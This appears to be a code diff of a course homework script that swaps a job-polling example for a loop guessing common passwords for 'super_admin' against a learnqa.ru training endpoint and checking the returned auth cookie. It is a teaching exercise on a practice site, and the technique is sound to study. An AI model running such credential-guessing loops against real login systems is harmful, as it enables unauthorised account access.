@@ -1,54 +1,14 @@
-from json.decoder import JSONDecodeError
 import requests
-import json
-import time
 
-response = requests.get("https://playground.learnqa.ru/ajax/api/longtime_job")
+top_password = {"123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345", "iloveyou", "111111", "123123", "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop", "654321", "555555", "lovely", "7777777", "welcome", "888888", "princess", "dragon", "password1", "123qwe"}
 
-try:
-    answer = json.loads(response.text)
-except JSONDecodeError:
-    print("Response is not a Json format")
+for x in top_password:
+    payload = {"login": "super_admin", "password": x}
+    response = requests.post("https://playground.learnqa.ru/api/get_secret_password_homework", data=payload)
+    answer = dict(response.cookies)
 
-if "token" in answer and "seconds" in answer:
-    token = answer["token"]
-    second = answer["seconds"]
-else:
-    print("Ключей 'token' или 'seconds' в JSON не оказалось")
+    response_check = requests.get("https://playground.learnqa.ru/api/check_auth_cookie", cookies=answer)
+    if response_check.text == "You are authorized":
+        print(f"Пароль: {x} c ответом {response_check.text}")
 
-
-print(f"token: {token} seconds: {second}")
-
-# Обращаемся пока задача ещё не готова
-payload = {"token": token}
-response_with_token = requests.get("https://playground.learnqa.ru/ajax/api/longtime_job", params=payload)
-try:
-    answer = json.loads(response_with_token.text)
-except JSONDecodeError:
-    print("Response is not a Json format")
-
-if "status" in answer:
-    status = answer["status"]
-else:
-    print("Ключа 'status' в JSON не оказалось")
-
-print(f"Текущий статус: {status}")
-
-# Засыпаем на время выполнения задачи
-time.sleep(second)
-
-# Запрос по готовности задачи
-response_with_token = requests.get("https://playground.learnqa.ru/ajax/api/longtime_job", params=payload)
-
-try:
-    answer = json.loads(response_with_token.text)
-except JSONDecodeError:
-    print("Response is not a Json format")
-
-if "result" in answer:
-    result = answer["result"]
-else:
-    print("Ключа 'result' в JSON не оказалось")
-
-print(f"Результат: {result}")
 
